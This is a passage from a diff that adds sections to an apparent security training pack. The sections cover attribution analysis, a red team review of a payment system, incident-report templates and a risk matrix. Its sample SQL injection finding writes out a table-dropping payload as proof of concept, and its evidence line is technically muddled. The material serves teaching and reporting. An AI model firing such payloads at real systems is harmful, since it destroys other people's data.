+  | Evidence                     | H1:APT | H2:Insider | H3:Ransomware | H4:Script Kiddie |
+  |------------------------------|--------|------------|---------------|------------------|
+  | Custom malware used          | +      | neutral    | -             | -                |
+  | Targeted specific files      | +      | +          | -             | neutral          |
+  | Slow, quiet exfiltration     | +      | +          | -             | -                |
+  | Used known ransomware tool   | -      | -          | +             | +                |
+  | No ransom note               | +      | +          | -             | neutral          |
+  | Used valid credentials       | neutral| +          | neutral       | neutral          |
+  | Exfil to cloud storage       | +      | +          | neutral       | -                |
+
+  Scoring: Count + (consistent) vs - (inconsistent)
+  H1 (APT): 5+ vs 1- → Most consistent
+  H2 (Insider): 4+ vs 0- → Possible
+  H3 (Ransomware): 1+ vs 4- → Unlikely
+  H4 (Script Kiddie): 1+ vs 3- → Unlikely
+
+3. TEAM A/TEAM B RED TEAMING
+Scenario: Security architecture review for new payment system
+
+Team A (Defenders):
+  Design: WAF + API gateway + HSM for card data + PCI DSS compliance
+  Argument: Layered controls, industry standard, certified environment
+
+Team B (Attackers — internal red team):
+  Attack vectors:
+    - WAF bypass via chunked encoding
+    - API logic flaws: Race condition on payment idempotency key
+    - HSM: Key ceremony compromise via insider
+    - PCI scope reduction via network segmentation bypass
+  Findings: API race condition allows double-spending
+
+  Outcome: Team B finds critical logic flaw Team A's controls missed
+  Resolution: Fix race condition before launch; add idempotency enforcement
+
+--- PROFESSIONAL COMMUNICATION OF SECURITY FINDINGS ---
+
+EXECUTIVE SUMMARY TEMPLATE:
+"On [DATE], we identified a [SEVERITY] security incident affecting [SCOPE].
+An attacker [ACTION] resulting in potential exposure of [DATA TYPE] for
+[NUMBER] customers/users. We have [CONTAINED/NOT CONTAINED] the incident and
+estimate [LOW/MEDIUM/HIGH] likelihood of further harm. Recommended immediate
+actions are [1, 2, 3]. Full remediation is estimated at [TIMELINE] at a cost of
+approximately [COST RANGE]."
+
+TECHNICAL FINDING FORMAT (CVSS + Business Impact):
+  Finding: SQL Injection in /api/v1/search endpoint
+  Severity: Critical (CVSS 9.8 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+  Affected component: Product search functionality
+  Impact: Unauthenticated attacker can read, modify, or delete all database contents
+  Business impact: Full customer PII exposure (GDPR breach notification required),
+                   intellectual property theft, service disruption
+  Evidence: INSERT INTO users... via UNION SELECT
+  Proof of concept: GET /api/v1/search?q='; DROP TABLE users;--
+  Remediation: Parameterized queries (prepared statements); immediate priority
+  Verification: Retest after fix; automated DAST in CI/CD pipeline
+
+RISK SCORING MATRIX:
+  Likelihood × Impact = Risk Score
+  Likelihood:
+    1 — Very unlikely: No known exploit, requires physical access
+    2 — Unlikely: Complex exploit, limited threat actors capable
+    3 — Possible: PoC exists, motivated threat actors
+    4 — Likely: Actively exploited, easy exploit
+    5 — Near certain: Automated exploitation at scale
+
+  Impact:
+    1 — Negligible: No sensitive data, no service disruption
+    2 — Minor: Non-PII data, brief disruption
+    3 — Moderate: PII for some users, hours of downtime
+    4 — Major: PII for all users, days of downtime, financial loss
+    5 — Critical: Full system compromise, data destruction, regulatory action
+
+  Risk:
+    1-4: Low (review quarterly)
+    5-9: Medium (fix within 90 days)
+    10-16: High (fix within 30 days)
+    17-25: Critical (fix immediately)
+
+================================================================================
+END OF TITAN EXPANDED PROFESSIONAL PACK v2.0
+SECTIONS COVERED:
+1. Malware Analysis (Static, Dynamic, Code Patterns, Reverse Engineering)
+2. Exploit Development (Stack/Heap, ROP chains, Mitigation bypasses)
+3. Cloud Security (AWS attacks, Kubernetes escape, DevSecOps)
+4. Network Security (TLS deep dive, PCAP analysis, Zeek scripting)
+5. Structured Analytic Techniques (ACH, Red/Blue team, Executive reporting)
+================================================================================
